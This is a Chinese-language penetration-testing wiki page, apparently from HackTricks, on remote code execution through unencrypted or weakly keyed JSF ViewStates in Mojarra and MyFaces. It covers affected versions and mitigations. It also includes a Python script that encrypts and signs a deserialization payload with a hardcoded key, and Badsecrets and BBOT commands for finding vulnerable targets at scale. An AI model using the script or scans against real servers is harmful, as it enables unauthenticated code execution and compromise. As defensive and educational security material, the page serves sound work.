# 介绍

在我们研究了[通过配置错误的JSON库进行RCE](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html)之后，我们开始分析JSF实现的ViewStates。[JavaServer Faces (JSF)](https://en.wikipedia.org/wiki/JavaServer_Faces)是一种用于构建可重用组件的Web用户界面（UI）技术。JSF主要用于企业应用程序，JSF实现通常由在Java应用服务器上运行的Web应用程序使用，如JBoss EAP或WebLogic Server。JSF规范有两个众所周知的实现：

* Oracle Mojarra（JSF参考实现）
* Apache MyFaces

# 范围

本博客文章重点介绍两个JSF 2.x实现：Oracle Mojarra（参考实现）和Apache MyFaces。旧版本的实现（JSF 1.x）也可能受到本文所述漏洞的影响。（JSF 2.0.x最初发布于2009年，当前版本为2.3.x）。

# ViewState的状态

JSF与类似的Web技术之间的一个区别是，JSF除了会话之外还使用ViewStates来存储视图的当前状态（例如，当前应显示的视图的哪些部分）。ViewState可以存储在`服务器`或`客户端`上。JSF ViewStates通常会自动嵌入到HTML表单中作为隐藏字段，字段名为`javax.faces.ViewState`。如果提交表单，则会将它们发送回服务器。

## 服务器端ViewState

如果JSF ViewState配置为位于`服务器`上，则隐藏的`javax.faces.ViewState`字段包含一个ID，该ID帮助服务器检索正确的状态。在MyFaces的情况下，该ID是一个**序列化的Java对象**！

## 客户端ViewState

如果JSF ViewState配置为位于`客户端`上，则隐藏的`javax.faces.ViewState`字段包含一个**序列化的Java对象**，至少经过Base64编码。您可能已经意识到，这是一条潜在的灾难之路！这可能是现在JSF ViewStates在发送到客户端之前进行加密和签名的原因之一。序列化Java对象的危险性

2015年，在AppSec California会议上，[Gabriel Lawrence](https://twitter.com/gebl)和[Chris Frohoff](https://twitter.com/frohoff)举行了一个名为[Marshalling Pickles (how deserializing objects can ruin your day)](https://frohoff.github.io/appseccali-marshalling-pickles/)的演讲。这个演讲揭示了Java对象序列化的一些被遗忘的问题，并导致了[几个严重的远程代码执行（RCE）漏洞](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)的发现。

不幸的是，这导致一些人认为通过删除/更新某些版本的Apache Commons Collections可以减轻漏洞。这确实可以帮助，但不能解决问题的根本原因：对不受信任数据的反序列化（[CWE 502](https://cwe.mitre.org/data/definitions/502.html)）。换句话说：\
**使用“易受攻击”的Apache Commons Collections版本并不意味着应用程序存在漏洞，而没有这样的库版本也并不意味着应用程序没有漏洞。**

然而，在一个恶意黑客通过“Mad Gadget”/“Apache Commons Collections Deserialization Vulnerability”关闭并加密了旧金山市交通局的系统之后，谷歌启动了[Operation Rosehub](https://opensource.googleblog.com/2017/03/operation-rosehub.html)。Operation Rosehub的目标是尽可能多地找到使用“易受攻击”的commons collections版本作为依赖项的Java开源项目，并向项目所有者提交拉取请求，以便这些项目在新版本中停止使用有问题的commons collections版本。
# 对ViewState的攻击

假设我们有一个基于JSF的Web应用程序，其中包含一个登录页面：

![基于JSF的登录页面](https://www.alphabot.com/images/blog/jsf-viewstate/jsf-viewstate-login.png)

该登录页面具有一个未加密且未签名的ViewState。因此，当我们查看其HTML源代码时，我们会看到一个包含ViewState的隐藏字段：未加密的MyFaces ViewState：
```
<input type="hidden" name="javax.faces.ViewState" id="j_id__v_0:javax.faces.ViewState:1" value="rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s" autocomplete="off" />
```
如果您使用Base64解码上述ViewState，您会注意到它包含一个序列化的Java对象。当表单提交时（例如点击登录），此ViewState通过POST发送回服务器。现在，在ViewState被发送回服务器之前，攻击者使用服务器类路径上已经存在的gadget（例如`commons-collections-3.2.1.jar`中的`InvokerTransformer`）或者甚至是公众尚未知晓的gadget，将ViewState替换为自己的恶意ViewState。通过在ViewState中放置恶意gadget，攻击者可以指定他想在服务器上运行的命令。攻击者可以通过`InvokerTransformer`指定要在服务器上执行的命令行命令。在我们的示例中，攻击者选择在我们基于Linux的服务器的UI上启动计算器。

在攻击者将修改后的表单发送回服务器后，JSF实现尝试反序列化提供的ViewState。现在，在ViewState的反序列化结束之前，命令被执行，计算器在服务器上启动：

![通过JSF ViewState启动的计算器](https://www.alphabot.com/images/blog/jsf-viewstate/jsf-viewstate-started-calculator.png)

所有这些都发生在JSF实现检查ViewState并判断其是否有效之前。当发现ViewState无效时，通常会向客户端发送错误消息，例如“视图已过期”。但那时已经太晚了。攻击者已经访问了服务器并运行了命令。（大多数真实世界的攻击者不会启动计算器，而是通常部署远程shell，然后使用它来访问服务器。）

=> 总的来说，这个示例演示了一个非常危险的未经身份验证的远程代码执行（RCE）漏洞。

（几乎与上述所示的JSF攻击场景相同的攻击场景已经在2015年的演示中概述和演示（第65至67页）：[Marshalling Pickles](https://frohoff.github.io/appseccali-marshalling-pickles/)，由Frohoff和Lawrence主持。）

# 成功攻击的前提条件

那么，造成灾难的条件是什么？

* 未加密的ViewState（或者拥有加密密钥）
* 服务器类路径上的gadget
* 对于Mojarra：将ViewState配置为驻留在“client”上
* 对于MyFaces：将ViewState配置为驻留在“client”或“server”上

让我们看看这些点与两个JSF实现的关系。

# Oracle Mojarra（JSF参考实现）

如前所述，Oracle Mojarra是JSF参考实现（RI），但可能不以该名称为人所知。它可能被称为Sun JSF RI，使用java包名`com.sun.faces`或具有模糊的jar名称`jsf-impl.jar`。

## Mojarra：未加密的ViewState

事实是：在大多数2.0.x和2.1.x版本中，默认情况下，Mojarra没有对客户端的ViewState进行加密和签名。需要注意的是，服务器端ViewState是两个JSF实现的默认设置，但开发人员可以通过将`javax.faces.STATE_SAVING_METHOD`参数设置为`client`来轻松切换配置以使用客户端的viewstate。该参数名称并不透露将其更改为client会引入严重的远程代码执行漏洞（例如，集群Web应用程序可能使用客户端的viewstate）。

虽然在Mojarra 2.2及更高版本中，默认情况下使用客户端ViewState加密，但在2.0.x和2.1.x分支中并非如此。然而，2016年5月，Mojarra开发人员开始将默认的客户端ViewState加密回溯到[2.0.x](https://github.com/javaserverfaces/mojarra/issues/4142)和[2.1.x](https://github.com/javaserverfaces/mojarra/issues/4141)，当他们意识到未加密的ViewState会导致RCE漏洞时。

因此，至少从2.1.x分支的[2.1.29-08](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.1.29-08)版本（于2016年7月发布）和2.0.x的[2.0.11-04](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.0.11-04)版本（也于2016年7月发布）开始，默认情况下启用了加密。

当我们分析Mojarra库时，我们注意到Red Hat也发布了2.1.x和2.0.x分支的Mojarra版本，最新版本是[2.1.29-jbossorg-1](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.1.29-jbossorg-1)和[2.0.4-b09-jbossorg-4](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.0.4-b09-jbossorg-4)。由于这两个版本都没有默认的ViewState加密，我们联系了Red Hat，他们迅速在其缺陷跟踪器中创建了[Bug 1479661 - JSF client side view state saving deserializes data](https://bugzilla.redhat.com/show_bug.cgi?id=1479661)，并提供了以下对于2.1.x分支的缓解建议：

> 一个易受攻击的Web应用程序需要将javax.faces.STATE_SAVING_METHOD设置为'client'以启用客户端视图状态保存。在企业应用平台（EAP）6.4.x上的默认值为'server'。\
> \
> 如果将javax.faces.STATE_SAVING_METHOD设置为'client'，则可以通过在应用程序的web.xml中设置com.sun.faces.ClientStateSavingPassword来加密视图：
>
> ```markup
>   <context-param>
>     <param-name>javax.faces.STATE_SAVING_METHOD</param-name>
>     <param-value>client</param-value>
>   </context-param>
>
>   <env­-entry>
>     <env­-entry-­name>com.sun.faces.ClientStateSavingPassword</env­-entry-­name>
>     <env-­entry-­type>java.lang.String</env-­entry-­type>
>     <env-­entry-­value>[some secret password]</env-­entry-­value>
>   </env­-entry>
> ```

不幸的是，在一些更旧的版本中，这种缓解方法不起作用：根据[这个很棒的StackOverflow答案](https://stackoverflow.com/questions/28231372/com-sun-faces-clientstatesavingpassword-recommendations-for-actual-password)，在JSF实现文档中错误地记录了参数`com.sun.faces.ClientStateSavingPassword`用于更改客户端状态保存密码，而直到2.1.18版本，该参数错误地被称为`ClientStateSavingPassword`。因此，按照文档提供的方式提供客户端状态保存密码没有效果！在Mojarra 2.1.19及更高版本中，他们将参数名称更改为文档中的名称`com.sun.faces.ClientStateSavingPassword`。

Mojarra现在默认使用`AES`作为加密算法，并使用`HMAC-SHA256`对ViewState进行身份验证。
## Mojarra: ViewState配置为存储在客户端

Mojarra的默认`javax.faces.STATE_SAVING_METHOD`设置为`server`。开发人员需要手动将其更改为`client`，以使Mojarra变得容易受到上述描述的攻击场景的影响。如果将序列化的ViewState发送到服务器，但Mojarra使用`server`端的ViewState保存，它将不会尝试对其进行反序列化（但可能会出现`StringIndexOutOfBoundsException`）。

## Mojarra: 缓解措施

当使用具有服务器端ViewState的Mojarra时，无需采取任何措施。

当使用Mojarra < 2.2和客户端ViewState时，有以下可能的缓解措施：

* 将Mojarra更新到2.0.11-04或2.1.29-08。
* 使用服务器端ViewState而不是客户端ViewState。
* 当使用较旧版本的Mojarra且无法进行更新或切换到服务器端ViewState时：设置一个ViewState密码作为临时解决方案，并确保它是正确的参数（不一定是相应文档中的参数）。

对于较新的Mojarra版本：

* 检查ViewState加密是否通过参数`com.sun.faces.disableClientStateEncryption`禁用。

# Apache MyFaces

Apache MyFaces是另一个大型且广泛使用的JSF实现。

## MyFaces: 未加密的ViewState

MyFaces默认情况下会对ViewState进行加密，如其[安全配置Wiki页面](https://wiki.apache.org/myfaces/Secure_Your_Application)所述：

> 默认情况下启用加密。请注意，在生产环境中必须使用加密，而禁用加密只能在测试/开发环境中有效。

但是，可以通过将参数`org.apache.myfaces.USE_ENCRYPTION`设置为`false`来禁用ViewState加密（也可以使用加密，但手动设置一个易于猜测的密码）。默认情况下，每次服务器重新启动时，ViewState加密密钥都会更改。

默认情况下，MyFaces使用`DES`作为加密算法，并使用`HMAC-SHA1`对ViewState进行身份验证。可以配置更近期的算法，如`AES`和`HMAC-SHA256`。

## MyFaces: ViewState配置为存储在客户端

MyFaces的默认`javax.faces.STATE_SAVING_METHOD`设置为`server`。但是：**MyFaces始终会反序列化ViewState**，无论该设置如何。因此，[在使用MyFaces时不要禁用加密非常重要](https://issues.apache.org/jira/browse/MYFACES-4021)！

（我们在MyFaces错误跟踪器中创建了一个问题：[MYFACES-4133 如果状态保存方法为服务器，则不要反序列化ViewState-ID](https://issues.apache.org/jira/browse/MYFACES-4133)，也许[这次](https://issues.apache.org/jira/browse/MYFACES-4021)对更安全的默认设置的期望会实现。）

## MyFaces: 缓解措施

在使用MyFaces时，请确保ViewState的加密未被禁用（通过`org.apache.myfaces.USE_ENCRYPTION`），无论ViewState存储在客户端还是服务器上。

## 自定义加密

如果以某种方式窃取了使用的密码，可以使用此脚本对Web服务器进行加密和签名攻击：
```python
#!/usr/bin/python3
import sys
import hmac
from urllib import parse
from base64 import b64encode
from hashlib import sha1
from pyDes import *

YELLOW = "\033[93m"
GREEN = "\033[32m"

def encrypt(payload,key):
cipher = des(key, ECB, IV=None, pad=None, padmode=PAD_PKCS5)
enc_payload = cipher.encrypt(payload)
return enc_payload

def hmac_sig(enc_payload,key):
hmac_sig = hmac.new(key, enc_payload, sha1)
hmac_sig = hmac_sig.digest()
return hmac_sig

key = b'JsF9876-'

if len(sys.argv) != 3 :
print(YELLOW + "[!] Usage : {} [Payload File] [Output File]".format(sys.argv[0]))
else:
with open(sys.argv[1], "rb") as f:
payload = f.read()
f.close()
print(YELLOW + "[+] Encrypting payload")
print(YELLOW + "  [!] Key : JsF9876-\n")
enc_payload = encrypt(payload,key)
print(YELLOW + "[+] Creating HMAC signature")
hmac_sig = hmac_sig(enc_payload,key)
print(YELLOW + "[+] Appending signature to the encrypted payload\n")
payload = b64encode(enc_payload + hmac_sig)
payload = parse.quote_plus(payload)
print(YELLOW + "[*] Final payload : {}\n".format(payload))
with open(sys.argv[2], "w") as f:
f.write(payload)
f.close()
print(GREEN + "[*] Saved to : {}".format(sys.argv[2]))
```
# 使用Badsecrets进行已知密钥检测

![Badsecrets](https://github.com/blacklanternsecurity/badsecrets) 是一个库，能够通过查看密钥生成的产品，并与已知或弱密钥列表进行比对，来检测已知加密密钥的使用情况。其`Jsf_viewstate`模块能够检测使用已知密钥创建的Java Server Faces ViewStates，无论是在Mojarra还是MyFaces上，还能检测未受保护或压缩的ViewStates。

使用`cli.py`示例工具是最快捷的方法，具体操作如下：
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/cli.py Ly8gp+FZKt9XsaxT5gZu41DDxO74k029z88gNBOru2jXW0g1Og+RUPdf2d8hGNTiofkD1VvmQTZAfeV+5qijOoD+SPzw6K72Y1H0sxfx5mFcfFtmqX7iN6Gq0fwLM+9PKQz88f+e7KImJqG1cz5KYhcrgT87c5Ayl03wEHvWwktTq9TcBJc4f1VnNHXVZgALGqQuETU8hYwZ1VilDmQ7J4pZbv+pvPUvzk+/e2oNeybso6TXqUrbT2Mz3k7yfe92q3pRjdxRlGxmkO9bPqNOtETlLPE5dDiZYo1U9gr8BBQ=
```
![](https://user-images.githubusercontent.com/24899338/227623883-f760570d-796e-459d-87b0-b87ad33999ae.png)

如果找到匹配项，它还会列出平台（Mojarra或MyFaces）、使用的加密算法以及是否使用了压缩，这些都是利用所必需的。

为了在规模上搜索易受攻击的视图状态，可以与子域枚举一起使用`badsecrets` [**BBOT**]()模块：
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![](https://user-images.githubusercontent.com/24899338/227626488-e45e99b2-0f6d-451e-8a43-7d6db75098de.png)


# 总结

本博客文章中介绍的关于JSF ViewStates及其危险性的大部分事实并不是新的，但似乎从未以如此简明的方式呈现过。它再次表明，看似无害的配置更改可能导致严重的漏洞。

\=> 问题之一似乎是安全研究人员与实际使用和配置可能在某些方式下危险的库的开发人员之间的知识转移不足。

# 参考资料

* [https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
* [https://0xrick.github.io/hack-the-box/arkham/](https://0xrick.github.io/hack-the-box/arkham/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
